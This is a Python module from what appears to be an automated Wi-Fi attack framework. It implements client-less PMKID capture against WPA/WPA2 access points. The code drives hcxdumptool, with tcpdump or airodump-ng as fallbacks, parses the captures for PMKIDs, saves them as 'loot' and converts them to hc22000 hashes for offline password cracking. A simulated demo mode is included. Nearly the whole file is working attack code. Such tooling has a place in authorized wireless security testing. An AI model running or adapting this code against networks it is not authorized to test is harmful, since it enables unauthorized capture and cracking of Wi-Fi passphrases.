"""Client-less PMKID capture (hcxdumptool, with a tcpdump fallback)."""

from __future__ import annotations

import contextlib
import os
import re
import time
from pathlib import Path
from typing import List, Optional

from ..deps import registry
from ..events import EK
from ..models import STATUS_FAILED, STATUS_SUCCESS, AccessPoint, Attempt, Capture
from ..util import Process, human_duration, run
from .base import Attack, AttackContext, AttackOutcome


class PmkidAttack(Attack):
    name = "pmkid"
    label = "PMKID capture (client-less)"
    tool = "hcxdumptool / tcpdump"
    description = ("Request the RSN PMKID from the AP's first EAPOL message. "
                   "Works without any connected client and without deauthenticating "
                   "anyone, so it is the least disruptive WPA2 attack available.")
    # deauth is not needed; injection yes
    requires = ()

    def applies(self, ap: AccessPoint) -> bool:
        return ap.encryption in ("WPA", "WPA2", "WPA2/WPA3")

    def available(self, ctx: AttackContext) -> bool:
        return bool(ctx.demo or registry.has("hcxdumptool") or registry.has("tcpdump")
                    or registry.has("airodump-ng"))

    def unavailable_reason(self, ctx: AttackContext) -> str:
        return "needs hcxdumptool (hcxtools) or tcpdump"

    # ---------------------------------------------------------------- #
    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(
            self.name, ap.bssid, tool=self.tool, chosen_by=getattr(ap, "picked_by", "heuristic"),
            reason=getattr(ap, "pick_reason", ""),
        )
        if ap.has_pmkid:
            return AttackOutcome.skipped("PMKID already captured")
        if ctx.demo:
            return self._run_demo(ctx, ap, attempt)
        if registry.has("hcxdumptool"):
            outcome = self._run_hcx(ctx, ap, attempt)
            if outcome.status == STATUS_SUCCESS:
                return outcome
            # fall through to the sniffing fallback on failure
            ctx.bus.log("hcxdumptool produced no PMKID, falling back to passive sniff",
                        level="debug")
        return self._run_sniff(ctx, ap, attempt)

    # ---------------------------------------------------------------- #
    def _run_demo(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt) -> AttackOutcome:
        timeout = min(ctx.config.attack_timeout_for(self.name), 40)
        deadline = time.time() + timeout
        step = 0
        while time.time() < deadline and not ctx.want_stop():
            step += 1
            ctx.progress(f"requesting PMKID from {ap.display_name}", kind="capture",
                         bssid=ap.bssid, percent=min(95, step * 16),
                         detail="association request + EAPOL M1 (simulated)")
            time.sleep(0.6)
            if ctx.radio.pmkid_ok(ap.bssid):
                from ..pcap import analyze_file
                from ..synth import build_capture
                path = ctx.artifact_path("pmkid", ap, ".pcap")
                station = next((c.mac for c in ap.clients.values()), "02:00:00:00:00:01")
                demo_ap = ctx.radio.find(ap.bssid)
                _, pmkid = build_capture(
                    path, ap.essid or "demo", ap.bssid, station,
                    (demo_ap.psk if demo_ap else "") or "wifipilot-demo",
                    seed=abs(hash(ap.bssid)) % 100000,
                    include_pmkid=True, include_handshake=False)
                saved = ctx.session.save_artifact(path, "pmkid", ctx.loot_name(ap, "pmkid"))
                capture = Capture(kind="pmkid", bssid=ap.bssid, essid=ap.essid, path=saved,
                                  valid=True, tool="demo-radio", eapol=1,
                                  hash_path=saved,
                                  extra={"pmkid": pmkid, "simulated": True})
                ctx.session.add_capture(capture)
                ctx.session.end_attempt(attempt, STATUS_SUCCESS, "PMKID captured",
                                        "client-less PMKID (simulated)", capture)
                ctx.bus.log(f"PMKID captured for {ap.display_name} (simulated)", level="success")
                return AttackOutcome.success("PMKID captured", capture,
                                             "client-less PMKID (simulated)")
        return self._fail(ctx, attempt, "no PMKID in the association responses",
                          f"{int(timeout)}s budget exhausted")

    # ---------------------------------------------------------------- #
    def _hcx_args(self, monitor: str, out_path: str, ap: AccessPoint) -> List[str]:
        """Build hcxdumptool arguments for both the v5 and v6 CLI dialects."""
        binary = registry.path("hcxdumptool") or "hcxdumptool"
        help_text = run([binary, "--help"], timeout=10).text
        modern = "--enable_status" in help_text or "-w, --write" in help_text
        if modern:
            args = [binary, "-i", monitor, "-w", out_path, "--enable_status=1",
                    "--disable_deauthentication" if hasattr(self, "_no_deauth") else "--attempt_client_ap"]
            args = [a for a in args if a != "--attempt_client_ap"]
            args += ["--filtermode=2", f"--filterlist_ap={ap.bssid}"]
        else:
            args = [binary, "-i", monitor, "-o", out_path, "-c", ap.bssid, "--enable_status=1"]
        return args

    def _run_hcx(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt) -> AttackOutcome:
        timeout = ctx.config.attack_timeout_for(self.name)
        out_path = ctx.artifact_path("pmkid", ap, ".pcapng")
        ctx.set_channel(ap.channel)
        args = self._hcx_args(ctx.monitor, out_path, ap)
        proc = Process(args, name="hcxdumptool", echo_lines=ctx.config.verbose_tools)
        proc.start()
        if proc.error:
            return self._fail(ctx, attempt, "hcxdumptool failed to start", proc.error)
        ctx.bus.log(f"PMKID hunt on {ap.display_name} (ch {ap.channel}) — "
                    f"up to {human_duration(timeout)}", level="info")
        found = ""
        started = time.time()
        try:
            while not ctx.want_stop() and time.time() - started < timeout:
                time.sleep(0.5)
                if os.path.exists(out_path) and os.path.getsize(out_path) > 0:
                    from ..pcap import analyze_file
                    analysis = analyze_file(out_path, max_packets=80000)
                    if analysis.pmkids:
                        found = analysis.pmkids[0].pmkid
                        break
                ctx.progress(f"PMKID hunt on {ap.display_name}", kind="capture",
                             bssid=ap.bssid,
                             percent=min(95, (time.time() - started) / max(1, timeout) * 100),
                             detail=f"{len(ap.clients)} clients, hcxdumptool running")
        finally:
            with contextlib.suppress(Exception):
                proc.stop()

        if found:
            return self._finish_pmkid(ctx, ap, attempt, out_path, found, "hcxdumptool")
        if os.path.exists(out_path) and os.path.getsize(out_path) == 0:
            with contextlib.suppress(OSError):
                os.unlink(out_path)
        return self._fail(ctx, attempt, "no PMKID returned by hcxdumptool",
                          "AP may not expose a PMKID for association requests")

    # ---------------------------------------------------------------- #
    def _run_sniff(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt) -> AttackOutcome:
        """Passive fallback: capture beacon/EAPOL frames and grep for the PMKID KDE."""
        timeout = ctx.config.attack_timeout_for(self.name)
        dump = ctx.artifact_path("pmkid", ap, ".pcap")
        tool = registry.path("tcpdump") or registry.path("airodump-ng") or ""
        if not tool:
            return self._fail(ctx, attempt, "no capture tool available",
                              "install hcxtools or tcpdump")
        ctx.set_channel(ap.channel)
        if tool.endswith("airodump-ng"):
            args = [tool, ctx.monitor, "--bssid", ap.bssid, "-w", dump[:-4],
                    "--output-format", "pcap", "--write-interval", "1"]
            cap_path = dump
        else:
            args = [tool, "-i", ctx.monitor, "-w", dump, "-s", "0", "-U",
                    "-y", "IEEE802_11_RADIO", "-G", str(int(timeout))]
            cap_path = dump
        ctx.bus.log(f"passive PMKID sniff on {ap.display_name} for "
                    f"{human_duration(timeout)}", level="info")
        proc = Process(args, name=Path(tool).name, echo_lines=ctx.config.verbose_tools)
        proc.start()
        if proc.error:
            return self._fail(ctx, attempt, "capture tool failed", proc.error)
        started = time.time()
        found = ""
        try:
            while not ctx.want_stop() and time.time() - started < timeout:
                time.sleep(1.0)
                candidate = cap_path if os.path.exists(cap_path) else ""
                if not candidate:
                    for name in os.listdir(os.path.dirname(dump) or "."):
                        if name.startswith(os.path.basename(dump)[:-4]) and name.endswith(".cap"):
                            candidate = os.path.join(os.path.dirname(dump), name)
                            break
                if candidate and os.path.getsize(candidate) > 0:
                    from ..pcap import analyze_file
                    analysis = analyze_file(candidate, max_packets=80000)
                    if analysis.pmkids:
                        found = analysis.pmkids[0].pmkid
                        cap_path = candidate
                        break
                ctx.progress(f"sniffing for PMKID · {ap.display_name}", kind="capture",
                             bssid=ap.bssid,
                             percent=min(95, (time.time() - started) / max(1, timeout) * 100),
                             detail="waiting for an association/EAPOL with PMKID KDE")
        finally:
            with contextlib.suppress(Exception):
                proc.stop()
        if found:
            return self._finish_pmkid(ctx, ap, attempt, cap_path, found, Path(tool).name)
        return self._fail(ctx, attempt, "no PMKID seen",
                          "AP does not send a PMKID (common on 802.11r/PMF networks)")

    # ---------------------------------------------------------------- #
    def _finish_pmkid(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
                      path: str, pmkid: str, tool: str) -> AttackOutcome:
        hash_path = path
        hcxpcapngtool = registry.path("hcxpcapngtool")
        if hcxpcapngtool:
            converted = ctx.artifact_path("pmkid", ap, ".hc22000")
            result = run([hcxpcapngtool, "-o", converted, path], timeout=120)
            if os.path.exists(converted) and os.path.getsize(converted) > 0:
                hash_path = converted
        ctx.bus.log(f"PMKID {pmkid[:16]}… captured from {ap.display_name}", level="success")
        return self._succeed(ctx, ap, attempt, "pmkid", path, tool, "PMKID captured",
                             f"PMKID {pmkid}", eapol=1,
                             extra={"pmkid": pmkid, "hash": hash_path})
